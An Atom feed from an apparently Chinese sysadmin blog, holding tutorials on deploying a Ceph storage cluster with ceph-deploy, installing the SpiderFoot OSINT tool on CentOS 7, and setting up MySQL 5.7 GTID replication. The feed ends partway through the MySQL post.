<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>t1ger的茶馆</title>
  <subtitle>头顶有光终是幻，足下生云未是仙</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://t1ger.github.io/"/>
  <updated>2017-05-31T02:47:42.493Z</updated>
  <id>https://t1ger.github.io/</id>
  
  <author>
    <name>t1ger</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>INSTALL CEPH (QUICK)</title>
    <link href="https://t1ger.github.io/2017/05/26/INSTALL-CEPH-QUICK/"/>
    <id>https://t1ger.github.io/2017/05/26/INSTALL-CEPH-QUICK/</id>
    <published>2017-05-26T08:25:56.000Z</published>
    <updated>2017-05-31T02:47:42.493Z</updated>
    
    <content type="html"><![CDATA[<h5 id="概念介绍"><a href="#概念介绍" class="headerlink" title="概念介绍"></a><b>概念介绍</b></h5><p>Ceph的部署模式下主要包含以下几个类型的节点:</p>
<ul>
<li>Ceph OSD: 主要用来存储数据，处理数据的replication,恢复，填充，调整资源组合以及通过检查其他OSD进程的心跳信息提供一些监控信息给Ceph Monitors . 当Ceph Storage Cluster 要准备2份数据备份时，要求至少有2个Ceph OSD进程的状态是active+clean状态</li>
<li>Monitor: 维护集群map的状态，主要包括monitor map, OSD map, Placement Group (PG) map, 以及CRUSH map. Ceph 维护了 Ceph Monitors, Ceph OSD Daemons, 以及PGs状态变化的历史记录 (called an “epoch”)</li>
<li>MDS: Ceph Metadata Server (MDS)存储的元数据代表Ceph的文件系统 (i.e., Ceph Block Devices 以及Ceph Object Storage 不适用 MDS). Ceph Metadata Servers 让系统用户可以执行一些POSIX文件系统的基本命令，例如ls,find 等</li>
<li>PG全称Placement Grouops，是一个逻辑的概念，一个PG包含多个OSD。引入PG这一层其实是为了更好的分配数据和定位数据</li>
<li>RBD全称RADOS block device，是Ceph对外提供的块设备服务</li>
<li>RGW全称RADOS gateway，是Ceph对外提供的对象存储服务，接口与S3和Swift兼容</li>
<li>RADOS全称Reliable Autonomic Distributed Object Store，是Ceph集群的精华，用户实现数据分配、Failover等集群操作</li>
<li>Librados是Rados提供库，因为RADOS是协议很难直接访问，因此上层的RBD、RGW和CephFS都是通过librados访问的，目前提供PHP、Ruby、Java、Python、C和C++支持</li>
<li>CephFS全称Ceph File System，是Ceph对外提供的文件系统服务</li>
<li>CRUSH是Ceph使用的数据分布算法，类似一致性哈希，让数据分配到预期的地方</li>
</ul>
<h5 id="快速部署方案"><a href="#快速部署方案" class="headerlink" title="快速部署方案"></a><b>快速部署方案</b></h5><p>通过ceph-deploy可以快速便捷的安装上ceph,此方法部署需要一个管理节点（admin node)和3个节点来做ceph的存储集群<br>三台装有CentOS 7的主机，每台主机有三个磁盘(虚拟机磁盘要大于100G),详细信息如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">[root@node1 ~]# cat /etc/redhat-release </div><div class="line">CentOS Linux release 7.3.1611 (Core) </div><div class="line"></div><div class="line">[root@node1 ~]# lsblk</div><div class="line">NAME            MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</div><div class="line">sda               8:0    0  100G  0 disk </div><div class="line">├─sda1            8:1    0  500M  0 part /boot</div><div class="line">└─sda2            8:2    0 99.5G  0 part </div><div class="line">  ├─system-root 253:0    0 95.6G  0 lvm  /</div><div class="line">  └─system-swap 253:1    0  3.9G  0 lvm  [SWAP]</div><div class="line">sdb               8:16   0    2T  0 disk </div><div class="line">sdc               8:32   0    2T  0 disk </div><div class="line">sdd               8:48   0    2T  0 disk </div><div class="line"></div><div class="line">[root@node1 ~]# cat /etc/hosts</div><div class="line">192.168.138.140 admin</div><div class="line">192.168.138.141 node1</div><div class="line">192.168.138.142 node2</div><div class="line">192.168.138.143 node3</div></pre></td></tr></table></figure>
<p>集群配置如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">admin	192.168.138.140  deploy</div><div class="line">node1   192.168.138.141  mon*1 osd*3</div><div class="line">node2   192.168.138.142  mon*1 osd*3</div><div class="line">node3   192.168.138.143  mon*1 osd*3</div></pre></td></tr></table></figure></p>
<p>备注:在生产环境,每个osd对应一块硬盘,每个osd需要一个journal,建议使用ssd作为osd硬盘的journal.<br>这里测试环境将采用data和journal在一个硬盘的做法</p>
<h5 id="预检Preflight"><a href="#预检Preflight" class="headerlink" title="预检Preflight"></a><b>预检Preflight</b></h5><p>在admin node 节点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">1. install epel</div><div class="line">sudo yum install -y https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm</div><div class="line">2. add ceph source</div><div class="line">sudo cat &gt; /etc/yum.repos.d/ceph-deploy.repo &lt;&lt; EOF</div><div class="line">[ceph-noarch]</div><div class="line">name=Ceph noarch packages</div><div class="line">baseurl=https://download.ceph.com/rpm-kraken/el7/noarch</div><div class="line">enabled=1</div><div class="line">gpgcheck=1</div><div class="line">type=rpm-md</div><div class="line">gpgkey=https://download.ceph.com/keys/release.asc</div><div class="line">EOF</div><div class="line">3. install ceph-deploy</div><div class="line">sudo yum update &amp;&amp; sudo yum install ceph-deploy -y</div></pre></td></tr></table></figure></p>
<p>在admin node上创建一个拥有sudo权限的用户，并有sudo权限,不要使用ceph这个用户名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">sudo useradd -g wheel  neo &amp;&amp; su - neo</div><div class="line"></div><div class="line">ssh-keygen</div><div class="line">ssh-copy-id neo@node1</div><div class="line">ssh-copy-id neo@node2</div><div class="line">ssh-copy-id neo@node3</div></pre></td></tr></table></figure></p>
<p>如果开启了防火墙需要<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">sudo firewall-cmd --zone=public --add-service=ceph-mon --permanent</div><div class="line">sudo firewall-cmd --zone=public --add-service=ceph --permanent</div><div class="line">sudo firewalld-cmd --reload</div><div class="line">或者</div><div class="line"># firewall-cmd --zone=public --add-port=6789/tcp --permanent</div><div class="line"># firewall-cmd --zone=public --add-port=6800-7100/tcp --permanent</div><div class="line"># firewall-cmd --reload</div></pre></td></tr></table></figure></p>
<p>For iptables, add port 6789 for Ceph Monitors and ports 6800:7300 for Ceph OSDs</p>
<h5 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a><b>开始安装</b></h5><p>1.建立部署目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[neo@admin ~]$ ceph-deploy --version</div><div class="line">1.5.37</div><div class="line">[neo@admin ~]$ mkdir cluster</div><div class="line">[neo@admin ~]$ cd cluster/</div></pre></td></tr></table></figure></p>
<p>2.清理旧配置,全新安装略过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ceph-deploy purge node1 node2 node3</div><div class="line">ceph-deploy purgedata node1 node2 node3</div><div class="line">ceph-deploy forgetkeys</div></pre></td></tr></table></figure></p>
<p>3.Create the cluster<br>初始化集群，告诉 ceph-deploy 哪些节点是监控节点，命令成功执行后会在 cluster 目录下生成 ceph.conf, ceph.log, ceph.mon.keyring 等相关文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[neo@admin cluster]$ ceph-deploy new node1 node2 node3</div></pre></td></tr></table></figure></p>
<p>4.在每个 Ceph 节点上都安装 Ceph：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[neo@admin cluster]$ ceph-deploy install node1 node2 node3</div><div class="line">或者登陆节点,手动安装</div><div class="line">yum -y install ceph ceph-radosgw</div></pre></td></tr></table></figure></p>
<p>5.初始化监控节点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[neo@admin cluster]$ ceph-deploy mon create-initial</div></pre></td></tr></table></figure></p>
<p>6.查看一下 Ceph 存储节点的硬盘情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[neo@admin cluster]$ ceph-deploy disk list node1</div><div class="line">[neo@admin cluster]$ ceph-deploy disk list node2</div><div class="line">[neo@admin cluster]$ ceph-deploy disk list node3</div></pre></td></tr></table></figure></p>
<p>7.初始化 Ceph 硬盘，然后创建 osd 存储节点,(存储节点:单个硬盘:对应的 journal 分区，一一对应)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">ceph-deploy disk zap node1:sdb node1:sdc node1:sdd </div><div class="line">ceph-deploy osd create node1:sdb node1:sdc node1:sdd </div><div class="line"></div><div class="line">ceph-deploy disk zap node2:sdb node2:sdc node2:sdd </div><div class="line">ceph-deploy osd create node2:sdb node2:sdc node2:sdd </div><div class="line"></div><div class="line">ceph-deploy disk zap node3:sdb node3:sdc node3:sdd</div><div class="line">ceph-deploy osd create node3:sdb node3:sdc node3:sdd</div></pre></td></tr></table></figure></p>
<p>8.最后，我们把生成的配置文件从 ceph-adm 同步部署到其他几个节点，使得每个节点的 ceph 配置一致：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[neo@admin cluster]$ ceph-deploy --overwrite-conf admin admin node1 node2 node3</div></pre></td></tr></table></figure>
<h5 id="测试"><a href="#测试" class="headerlink" title="测试"></a><b>测试</b></h5><p>看一下配置成功了没？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">[root@admin ~]# ceph -s</div><div class="line">    cluster d6d92de4-2a08-4bd6-a749-6c104c88fc40</div><div class="line">     health HEALTH_WARN</div><div class="line">            too few PGs per OSD (21 &lt; min 30)</div><div class="line">     monmap e1: 3 mons at &#123;node1=192.168.138.141:6789/0,node2=192.168.138.142:6789/0,node3=192.168.138.143:6789/0&#125;</div><div class="line">            election epoch 6, quorum 0,1,2 node1,node2,node3</div><div class="line">     osdmap e53: 9 osds: 9 up, 9 in</div><div class="line">            flags sortbitwise,require_jewel_osds</div><div class="line">      pgmap v148: 64 pgs, 1 pools, 0 bytes data, 0 objects</div><div class="line">            307 MB used, 18377 GB / 18378 GB avail</div><div class="line">                  64 active+clean</div><div class="line">[root@admin ~]# ceph health</div><div class="line">HEALTH_WARN too few PGs per OSD (21 &lt; min 30)</div></pre></td></tr></table></figure></p>
<p>备注: 这里需要注意的事执行命令是在root权限下执行的，<br>因为etc/ceph/ceph.client.admin.keyring权限只允许root读写导致，亦可以给文件加权限解决<br>如果在neo权限下,报错如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[neo@admin cluster]$ ceph health</div><div class="line">2017-05-27 16:58:23.374074 7f567813a700 -1 auth: unable to find a keyring on /etc/ceph/ceph.client.admin.keyring,/etc/ceph/ceph.keyring,/etc/ceph/keyring,/etc/ceph/keyring.bin: (2) No such file or directory</div><div class="line">2017-05-27 16:58:23.374109 7f567813a700 -1 monclient(hunting): ERROR: missing keyring, cannot use cephx for authentication</div><div class="line">2017-05-27 16:58:23.374113 7f567813a700  0 librados: client.admin initialization error (2) No such file or directory</div><div class="line">Error connecting to cluster: ObjectNotFound</div></pre></td></tr></table></figure></p>
<p>在我们执行ceph -s 时警告PG太少,我们接下来解决,由于是新配置的集群，只有一个pool<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[neo@admin ~]$ sudo ceph osd lspools</div><div class="line">0 rbd,</div></pre></td></tr></table></figure></p>
<p>查看rbd pool的PGS<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[neo@admin ~]$ sudo ceph osd pool get rbd pg_num</div><div class="line">pg_num: 64</div></pre></td></tr></table></figure></p>
<p>pgs为64，因为是3副本的配置，所以当有9个osd的时候，每个osd上均分了64/0 *2=21个pgs,也就是出现了如上的错误 小于最小配置30个<br>解决办法：修改默认pool rbd的pgs和pgp_num,默认两个pg_num和pgp_num一样大小均为64，此处也将两个的值都设为128<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">[neo@admin ~]$ sudo ceph osd pool set rbd pg_num 128</div><div class="line">set pool 0 pg_num to 128</div><div class="line"></div><div class="line">[neo@admin ~]$ sudo ceph osd pool set rbd pgp_num 128</div><div class="line">set pool 0 pgp_num to 128set pool 0 pgp_num to 128</div><div class="line"></div><div class="line">[neo@admin ~]$ sudo ceph health</div><div class="line">HEALTH_OK</div><div class="line"></div><div class="line">[neo@admin ~]$ sudo ceph -s</div><div class="line">    cluster d6d92de4-2a08-4bd6-a749-6c104c88fc40</div><div class="line">     health HEALTH_OK</div><div class="line">     monmap e1: 3 mons at &#123;node1=192.168.138.141:6789/0,node2=192.168.138.142:6789/0,node3=192.168.138.143:6789/0&#125;</div><div class="line">            election epoch 16, quorum 0,1,2 node1,node2,node3</div><div class="line">     osdmap e89: 9 osds: 9 up, 9 in</div><div class="line">            flags sortbitwise,require_jewel_osds</div><div class="line">      pgmap v329: 128 pgs, 1 pools, 0 bytes data, 0 objects</div><div class="line">            314 MB used, 18377 GB / 18378 GB avail</div><div class="line">                 128 active+clean</div></pre></td></tr></table></figure></p>
<p>ref<br><a href="http://ceph.com/install/" target="_blank" rel="external">INSTALL CEPH (QUICK)</a><br><a href="http://www.codexiu.cn/linux/blog/42056/" target="_blank" rel="external">centos7 ceph-deploy 安装jewel</a><br><a href="http://zedshadow.leanote.com/post/%E4%BD%BF%E7%94%A8ceph-deploy%E5%BF%AB%E9%80%9F%E9%83%A8%E7%BD%B2Ceph" target="_blank" rel="external">centos7使用ceph-deploy快速部署Kraken版Ceph</a><br><a href="http://www.vpsee.com/2015/07/install-ceph-on-centos-7/" target="_blank" rel="external">在 CentOS 7.1 上安装分布式存储系统 Ceph</a><br><a href="http://www.cnblogs.com/zhangzhengyan/p/5839897.html" target="_blank" rel="external">ceph 创建和删除osd</a><br><a href="http://blog.csdn.net/xiongwenwu/article/details/53120415" target="_blank" rel="external">三种增删osd的方法数据量迁移大小</a><br><a href="https://www.virtualtothecore.com/en/quickly-build-a-new-ceph-cluster-with-ceph-deploy-on-centos-7/" target="_blank" rel="external">Quickly build a new Ceph cluster with ceph-deploy on CentOS 7</a><br><a href="http://blog.csdn.net/chinagissoft/article/details/50491429" target="_blank" rel="external">Ceph 集群部署</a><br><a href="https://my.oschina.net/diluga/blog/528618" target="_blank" rel="external">PG设置与规划</a><br><a href="https://my.oschina.net/xiaozhublog/blog/664560" target="_blank" rel="external">  health HEALTH_WARN too few PGs per OSD</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h5 id=&quot;概念介绍&quot;&gt;&lt;a href=&quot;#概念介绍&quot; class=&quot;headerlink&quot; title=&quot;概念介绍&quot;&gt;&lt;/a&gt;&lt;b&gt;概念介绍&lt;/b&gt;&lt;/h5&gt;&lt;p&gt;Ceph的部署模式下主要包含以下几个类型的节点:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Ceph OSD: 主要用来存储数
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Install SpiderFoot on Centos7</title>
    <link href="https://t1ger.github.io/2017/05/25/Install-SpiderFoot-on-centos7/"/>
    <id>https://t1ger.github.io/2017/05/25/Install-SpiderFoot-on-centos7/</id>
    <published>2017-05-25T09:48:22.000Z</published>
    <updated>2017-05-25T09:20:40.754Z</updated>
    
    <content type="html"><![CDATA[<h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a><b>简介</b></h5><p>SpiderFoot是一个Python编写的免费开源的网站信息收集类工具，并且支持跨平台运行，适用于Linux、*BSD和Windows系统。<br>此外，它还为用户提供了一个易于使用的GUI界面。<br>在功能方面SpiderFoot也为我们考虑的非常周全，通过SpiderFoot我们可以获取相关目标的各种信息，例如网站子域、电子邮件地址、web服务器版本等等。<br>SpiderFoot简单的基于Web的界面，使你能够在安装后立即启动扫描 – 只需简单的设置扫描目标域名，并启用相应的扫描模块即可</p>
<h5 id="环境依赖"><a href="#环境依赖" class="headerlink" title="环境依赖"></a><b>环境依赖</b></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install lxml netaddr M2Crypto cherrypy mako requests bs4</div></pre></td></tr></table></figure>
<h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a><b>安装</b></h5><p><a href="http://www.spiderfoot.net/download/" target="_blank" rel="external">点击这里下载</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">~$ tar zxvf spiderfoot-X.X.X-src.tar.gz</div><div class="line">~$ cd spiderfoot-X.X.X</div><div class="line">~/spiderfoot-X.X.X$</div></pre></td></tr></table></figure></p>
<h6 id=""><a href="#" class="headerlink" title=""></a><b?启动 spiderfoot<="" b=""></b?启动></h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">python ./sf.py</div><div class="line">or</div><div class="line">python ./sf.py 0.0.0.0:5001</div><div class="line"></div><div class="line">也可以指定端口</div><div class="line">python ./sf.py 127.0.0.1:9999</div></pre></td></tr></table></figure>
<h5 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a><b>遇到的问题</b></h5><ol>
<li><p>Python.h：No such file or directory<br>出现No such file or directory的错误，有两种情况，一种是真的没有Python.h这个文件，一种是Python的版本不对<br>可以进入/usr/include/文件夹下的Python2.x文件夹里查找是否有Python.h这个文件<br>这里是第一种,yum install python-devel 解决</p>
</li>
<li><p>fatal error: openssl/err.h:<br>执行 yum install openssl-devel 解决</p>
</li>
</ol>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h5 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;&lt;b&gt;简介&lt;/b&gt;&lt;/h5&gt;&lt;p&gt;SpiderFoot是一个Python编写的免费开源的网站信息收集类工具，并且支持跨平台运行，适用于Linux、*BSD和Wi
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>mysql5.7 Replication with Gtid</title>
    <link href="https://t1ger.github.io/2017/05/22/mysql5-7-Replication-with-Gtid/"/>
    <id>https://t1ger.github.io/2017/05/22/mysql5-7-Replication-with-Gtid/</id>
    <published>2017-05-22T10:10:42.000Z</published>
    <updated>2017-05-23T07:44:30.068Z</updated>
    
    <content type="html"><![CDATA[<p>测试介绍: 一主一从<br>运行环境:<br>centos7.3、mysql5.7.17</p>
<h5 id="理论准备"><a href="#理论准备" class="headerlink" title="理论准备"></a><b>理论准备</b></h5><ul>
<li><p>GTID工作原理</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">1. master更新数据时，会在事务前产生GTID，一同记录到binlog日志中</div><div class="line">2. slave端的i/o 线程将变更的binlog，写入到本地的relay log中</div><div class="line">3. sql线程从relay log中获取GTID，然后对比slave端的binlog是否有记录</div><div class="line">4. 如果有记录，说明该GTID的事务已经执行，slave会忽略</div><div class="line">5. 如果没有记录，slave就会从relay log中执行该GTID的事务，并记录到binlog</div><div class="line">6. 在解析过程中会判断是否有主键，如果没有就用二级索引，如果没有就用全部扫描</div></pre></td></tr></table></figure>
</li>
<li><p>GTID相关概念</p>
</li>
</ul>
<ol>
<li>GTID = server_uuid:transaction_id<br>server_uuid由MySQL在第一次启动时自动生成并被持久化到auto.cnf文件里，TID（transaction_id）是一个从1开始的自增计数，表示在这个主库上执行的第n个事务。MySQL会保证事务与GTID之间的1 : 1映射</li>
<li>server_uuid 来源于 auto.cnf<br>数据目录下有一个auto.cnf文件就是用来保存server_uuid</li>
<li>GTID: 在一组复制中，全局唯一<br>MySQL只要保证每台数据库的server_uuid全局唯一，以及每台数据库生成的transaction_id自身唯一，就能保证GTID的全局唯一性</li>
<li>gtid_executed<br>在当前实例上执行过的GTID集合; 实际上包含了所有记录到binlog中的事务。所以，设置set sql_log_bin=0后执行的事务不会生成binlog 事件，也不会被记录到gtid_executed中。执行RESET MASTER可以将该变量置空</li>
<li>gtid_purged<br>gtid_purged用于记录已经被清除了的binlog事务集合，它是gtid_executed的子集。只有gtid_executed为空时才能手动设置该变量，此时会同时更新gtid_executed为和gtid_purged相同的值。gtid_executed为空意味着要么之前没有启动过基于GTID的复制，要么执行过RESET MASTER。执行RESET MASTER时同样也会把gtid_purged置空，即始终保持gtid_purged是gtid_executed的子集</li>
<li><p>gtid_next<br>AUTOMATIC:自动生成下一个GTID，实现上是分配一个当前实例上尚未执行过的序号最小的GTID<br>ANONYMOUS:设置后执行事务不会产生GTID<br>显式指定的GTID:可以指定任意形式合法的GTID值，但不能是当前gtid_executed中的已经包含的GTID，否则，下次执行事务时会报错</p>
<p> 更多详情参考<a href="https://dev.mysql.com/doc/refman/5.7/en/replication-options-gtids.html" target="_blank" rel="external">replication-options-gtids</a></p>
</li>
</ol>
<ul>
<li><p>开启GTID的必备条件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">gtid_mode=ON(必选)  </div><div class="line">enforce-gtid-consistency（必选）</div><div class="line">log_bin=ON（可选）--高可用切换，最好设置ON  </div><div class="line">log-slave-updates=ON（可选）--高可用切换，最好设置ON</div></pre></td></tr></table></figure>
</li>
<li><p>GTID的不足</p>
</li>
</ul>
<ol>
<li>无法使用 CREATE TABLE … SELECT statements语句</li>
<li>无法在事务中使用 CREATE TEMPORARY TABLE</li>
<li>无法在事务中对非事务存储引擎进行更新</li>
<li>具体可参考: <a href="https://dev.mysql.com/doc/refman/5.7/en/replication-gtids-restrictions.html" target="_blank" rel="external">Restrictions on Replication with GTIDs</a></li>
</ol>
<h5 id="复制实现"><a href="#复制实现" class="headerlink" title="复制实现"></a><b>复制实现</b></h5><ul>
<li><p>这里我们的测试环境如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">master ip: 192.168.1.105</div><div class="line">slave ip : 192.168.1.106</div><div class="line">复制账户:</div><div class="line">root@localhost [(none)] &gt; CREATE USER &apos;repl&apos;@&apos;192.169.1.%&apos; IDENTIFIED BY &apos;repl_123456&apos;;</div><div class="line">Query OK, 0 rows affected (0.13 sec)</div><div class="line">root@localhost [(none)] &gt; GRANT REPLICATION SLAVE ON *.* TO &apos;repl&apos;@&apos;192.168.1.%&apos;;</div><div class="line">Query OK, 0 rows affected (0.00 sec)</div></pre></td></tr></table></figure>
</li>
<li><p>全新开始搭建</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div></pre></td><td class="code"><pre><div class="line">1. 所有server处于同一状态</div><div class="line">	mysql&gt; SET @@global.read_only = ON;</div><div class="line">2. 关闭所以mysql</div><div class="line">    mysqladmin -uusername -p shutdown</div><div class="line">3. 配置my.cnf开启GTID,重启mysql</div><div class="line">    root@localhost [(none)] &gt; show global variables like &apos;%gtid%&apos;;</div><div class="line">    +----------------------------------+-------+</div><div class="line">    | Variable_name                    | Value |</div><div class="line">    +----------------------------------+-------+</div><div class="line">    | binlog_gtid_simple_recovery      | ON    |</div><div class="line">    | enforce_gtid_consistency         | ON    |</div><div class="line">    | gtid_executed                    |       |</div><div class="line">    | gtid_executed_compression_period | 1000  |</div><div class="line">    | gtid_mode                        | ON    |</div><div class="line">    | gtid_owned                       |       |</div><div class="line">    | gtid_purged                      |       |</div><div class="line">    | session_track_gtids              | OFF   |</div><div class="line">    +----------------------------------+-------+</div><div class="line">    8 rows in set (0.01 sec)</div><div class="line">    </div><div class="line">    root@localhost [(none)] &gt; show variables like &apos;%gtid_next%&apos;;</div><div class="line">    +---------------+-----------+</div><div class="line">    | Variable_name | Value     |</div><div class="line">    +---------------+-----------+</div><div class="line">    | gtid_next     | AUTOMATIC |</div><div class="line">    +---------------+-----------+</div><div class="line">    1 row in set (0.01 sec)</div><div class="line">	</div><div class="line">或者</div><div class="line">   mysqld --gtid-mode=ON --log-bin --enforce-gtid-consistency &amp;</div><div class="line">	</div><div class="line">4. change master </div><div class="line">   mysql&gt; change master to</div><div class="line">         master_host=host,</div><div class="line">         master_port=port,</div><div class="line">         master_user=username,</div><div class="line">         master_password=password,</div><div class="line">         master_auto_position=1;</div><div class="line">   mysql&gt; start slave;</div><div class="line">   </div><div class="line">   root@localhost [(none)] &gt; CHANGE MASTER TO  MASTER_HOST=&apos;192.168.1.105&apos;,MASTER_PORT=3306,MASTER_USER=&apos;repl&apos;,MASTER_PASSWORD=&apos;repl_123456&apos;,MASTER_AUTO_POSITION=1;</div><div class="line">	Query OK, 0 rows affected, 2 warnings (0.16 sec)</div><div class="line">   